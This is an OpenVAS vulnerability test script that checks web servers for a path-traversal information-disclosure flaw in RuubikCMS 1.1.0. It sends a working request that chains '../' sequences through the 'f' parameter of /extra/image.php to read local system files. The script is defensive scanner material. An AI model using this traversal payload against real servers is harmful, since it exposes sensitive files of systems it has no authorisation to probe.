###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_RuubikCMS_50165.nasl 3117 2016-04-19 10:19:37Z benallard $
#
# RuubikCMS 'f' Parameter Information Disclosure Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "RuubikCMS is prone to an information-disclosure vulnerability because
it fails to sufficiently validate user-supplied data.

An attacker can exploit this issue to download local files in the
context of the webserver process. This may allow the attacker to
obtain sensitive information; other attacks are also possible.

RuubikCMS 1.1.0 is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(103312);
 script_version("$Revision: 3117 $");
 script_tag(name:"last_modification", value:"$Date: 2016-04-19 12:19:37 +0200 (Tue, 19 Apr 2016) $");
 script_tag(name:"creation_date", value:"2011-10-25 14:02:26 +0200 (Tue, 25 Oct 2011)");
 script_bugtraq_id(50165);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_name("RuubikCMS 'f' Parameter Information Disclosure Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/50165");
 script_xref(name : "URL" , value : "http://www.ruubikcms.com");

 script_tag(name:"qod_type", value:"remote_vul");
 script_summary("Determine if installed RuubikCMS is vulnerable");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dirs = make_list("/ruubikcms","/cms",cgi_dirs());
files = traversal_files();

foreach dir (dirs) {

  foreach file (keys(files)) {
   
    url = string(dir,"/extra/image.php?f=",crap(data:"../",length:9*3),files[file]); 

    if(http_vuln_check(port:port, url:url,pattern:file)) {
     
      security_message(port:port);
      exit(0);

    }
  }
}

exit(0);
